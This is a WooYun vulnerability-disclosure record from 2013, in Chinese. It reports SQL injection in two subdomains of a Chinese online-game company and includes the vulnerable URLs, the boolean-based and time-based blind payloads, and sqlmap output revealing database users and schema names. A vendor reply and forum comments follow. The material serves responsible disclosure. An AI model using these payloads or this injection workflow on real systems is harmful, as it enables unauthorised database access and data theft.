{"id": 6856, "wybug_id": "wooyun-2013-044023", "wybug_title": "竞技世界#2个分站存在SQL注射漏洞（root用户及管理员）", "wybug_corp": "竞技世界(北京)网络技术有限公司", "wybug_author": "Mr.leo", "wybug_date": "2013-11-25 17:57", "wybug_open_date": "2014-01-09 17:58", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-11-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-12-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-12-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-12-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-01-09：\t细节向公众公开  简要描述： 竞技世界#2个分站存在SQL注射漏洞（root用户及管理员） 详细说明：  站点1：www.xyj.zy.jj.cnid参数没有过滤，导致注射漏洞http://www.xyj.zy.jj.cn/theme/detail?id=10005&tid=1sqlmap跑起来Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=10005) AND 6626=6626 AND (3931=3931&tid=1---[11:58:43] [INFO] testing MySQL[11:58:53] [INFO] confirming MySQL[11:59:11] [INFO] the back-end DBMS is MySQLweb application technology: Apacheback-end DBMS: MySQL >= 5.0.0[11:59:11] [INFO] fetching current user[11:59:11] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[11:59:11] [INFO] retrieved: root@localhostcurrent user:    'root@localhost'[12:15:15] [INFO] fetching current database[12:15:15] [INFO] retrieved: modoercurrent database:    'modoer'[12:22:43] [INFO] fetching database names[12:22:43] [INFO] fetching number of databases[12:22:43] [INFO] retrieved: 5[12:23:47] [INFO] retrieved: information_schema[12:44:03] [INFO] retrieved: modoer[12:51:32] [INFO] retrieved: mysql[12:57:56] [INFO] retrieved: test[13:03:17] [INFO] retrieved: zoyooo当前用户是root\n\navailable databases [5]:[*] information_schema[*] modoer[*] mysql[*] test[*] zoyooo当前库有79张表\n\n站点2：http://star.jj.cnpid参数没有过滤，导致注射漏洞http://star.jj.cn/ajax/favorite.php?m=0.7818886050954461&pid=528afa68b068e5e434000833sqlmap跑起来Place: GETParameter: pid    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: m=0.7818886050954461&pid=528afa68b068e5e434000833' AND SLEEP(5) AND 'cwPF'='cwPF---[13:05:19] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.4.14back-end DBMS: MySQL 5.0.11[13:05:19] [INFO] fetching current user[13:05:19] [INFO] retrieved:[13:05:19] [WARNING] it is very important not to stress the network adapter's bandwidth during usage of time-based queriesC[13:07:11] [INFO] adjusting time delay to 3 seconds due to good response timeslubDbAd[13:19:30] [ERROR] invalid character detected. retrying..[13:19:30] [WARNING] increasing time delay to 4 secondsmin@%current user:    'ClubDbAdmin@%'[13:29:25] [INFO] fetching current database[13:29:25] [INFO] retrieved: CommunityRelati[13:56:58] [ERROR] invalid character detected. retrying..[13:56:58] [WARNING] increasing time delay to 5 secondsonSyscurrent database:    'CommunityRelationSys'[14:07:41] [INFO] fetching database names[14:07:41] [INFO] fetching number of databases[14:07:41] [INFO] retrieved: 38[14:10:41] [INFO] retrieved: informat[14:27:29] [ERROR] invalid character detected. retrying..[14:27:29] [WARNING] increasing time delay to 6 secondsion_schema[14:48:33] [INFO] retrieved: AdminSys[15:04:59] [INFO] retrieved: AttrS[15:16:54] [ERROR] invalid character detected. retrying..[15:16:54] [WARNING] increasing time delay to 7 secondsys[15:22:17] [INFO] retrieved: BackupDat[15:42:32] [ERROR] invalid character detected. retrying..[15:42:32] [WARNING] increasing time delay to 8 seconds[15:44:39] [ERROR] unable to properly validate last character value ('m')..mb[15:47:42] [ERROR] invalid character detected. retrying..[15:47:42] [WARNING] increasing time delay to 4 seconds[15:49:20] [ERROR] invalid character detected. retrying..[15:49:20] [WARNING] increasing time delay to 5 secondsase[15:55:33] [INFO] retrieved:[15:57:07] [ERROR] invalid character detected. retrying..[15:57:07] [WARNING] increasing time delay to 6 secondsBugFree[16:11:20] [INFO] retrieved: ClubDict[16:28:43] [ERROR] invalid character detected. retrying..[16:28:43] [WARNING] increasing time delay to 7 secondsSys[16:36:01] [INFO] retrieved: ClubLogs[16:54:06] [INFO] retrieved:[16:55:48] [ERROR] invalid character detected. retrying..[16:55:48] [WARNING] increasing time delay to 8 secondsClubSys[17:12:05] [INFO] retrieved: Comm当前用户是clubadmin\n\n太慢了没跑完----------------------------------------------------------------------over   漏洞证明：  已经证明   修复方案：  过滤，第一次关注竞技世界，求RANK20，求礼物。   版权声明：转载请注明来源 Mr.leo@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2013-11-25 18:33 厂商回复： 谢谢提供，已提交给相关人员处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-11-25 18:06 |    \t\tMr.leo \t\t\t( 普通白帽子  |\t\t\t        Rank:1314 漏洞数:176        | 说点神马呢！！)\t\t \n  @xsser @Finger @疯狗 求重新审核，里面有处贴成父母网的URL了。- -    \n     2013-11-25 18:07 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @Mr.leo 可以编辑    \n     2013-11-25 18:07 |    \t\tMr.leo \t\t\t( 普通白帽子  |\t\t\t        Rank:1314 漏洞数:176        | 说点神马呢！！)\t\t \n  @xsser 编辑过了，需要重新审核吧？    \n     2013-11-25 18:12 |    \t\tFinger  \t\t\t( 普通白帽子  |\t\t\t        Rank:777 漏洞数:95        | 最近有人冒充该账号行骗，任何自称Finger并...)\t\t \n  @Mr.leo 没看到新编辑的啊    \n     2013-11-26 10:54 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  都是来抢生意的    \n     2013-11-27 10:03 |    \t\tMr.leo \t\t\t( 普通白帽子  |\t\t\t        Rank:1314 漏洞数:176        | 说点神马呢！！)\t\t \n  @浩天 sorry - -    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}